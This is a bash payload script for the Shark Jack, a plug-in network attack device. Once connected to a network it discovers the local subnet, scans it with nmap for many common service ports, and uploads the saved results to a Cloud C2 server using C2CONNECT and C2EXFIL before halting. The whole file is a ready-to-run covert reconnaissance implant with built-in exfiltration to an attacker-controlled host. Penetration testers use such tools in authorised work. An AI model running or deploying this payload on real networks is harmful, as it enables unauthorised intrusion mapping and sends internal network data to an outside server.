#!/bin/bash
#
# Title: Custom Nmap Payload for Shark Jack
# Author: Flatlinebb
# Version: 1.02
#
# Scans target subnet with Nmap using specified options. Saves each scan result
# to loot storage folder. Uploads loot to your C2 server
#
# Red ...........Setup
# Amber..........Scanning
# Green..........Finished
#
# See nmap --help for options. Default "-sP" ping scans the address space for
# fast host discovery.

NMAP_OPTIONS="-p 21,22,23,53,69,80,123,139,443,445,554,1812,3389,5220,2022,4242,4343,5000,5650,5655,5670,5800,5900,8080,8333,8222,8765,8008,8009,8181,8282,8383,8484,8888,8443,9000,10000,32400,32401,32402,49153 --open"
LOOT_DIR=/root/loot/nmap
SCAN_DIR=/etc/shark/nmap


function finish() {
 LED CLEANUP
 # Kill Nmap
 echo $1
 wait $1
 kill $1 &> /dev/null

 # Exfiltrate all loot files
 FILES="$LOOT_DIR/*.*"
 for f in $FILES; do C2EXFIL STRING $f $SUBNET; done

 # Sync filesystem
 echo $SCAN_M > $SCAN_FILE
 sync
 sleep 1

 LED FINISH
 sleep 1
 
 # Halt system
 halt
}

function setup() {
 LED SETUP
 # Create loot directory
 mkdir -p $LOOT_DIR &> /dev/null
 
 # Set NETMODE to DHCP_CLIENT for Shark Jack v1.1.0+
 NETMODE DHCP_CLIENT
 # Wait for an IP address to be obtained
 while ! ifconfig eth0 | grep "inet addr"; do sleep 1; done
 # Create tmp scan directory
 mkdir -p $SCAN_DIR &> /dev/null

 # Create tmp scan file if it doesn't exist
 SCAN_FILE=$SCAN_DIR/scan-count
 if [ ! -f $SCAN_FILE ]; then
 touch $SCAN_FILE && echo 0 > $SCAN_FILE
 fi

 # Find IP address and subnet
 while [ -z "$SUBNET" ]; do
 sleep 1 && find_subnet
 done
}

function find_subnet() {
 SUBNET=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}" | sed 's/\.[0-9]*\//\.0\//')
}

function run() {
 # Run setup
 setup

 SCAN_N=$(cat $SCAN_FILE)
 SCAN_M=$(( $SCAN_N + 1 ))

 LED ATTACK

 # Connect to Cloud C2
 C2CONNECT
 # Wait until Cloud C2 connection is established
 while ! pgrep cc-client; do sleep 1; done

 # Start scan
 nmap $NMAP_OPTIONS $SUBNET -oA $LOOT_DIR/nmap-scan_$SCAN_M_`date +"%Y-%m-%d_%H%M%S"` &>/dev/null &
 tpid=$!
 sleep 1
 finish $tpid
}


# Run payload
run &
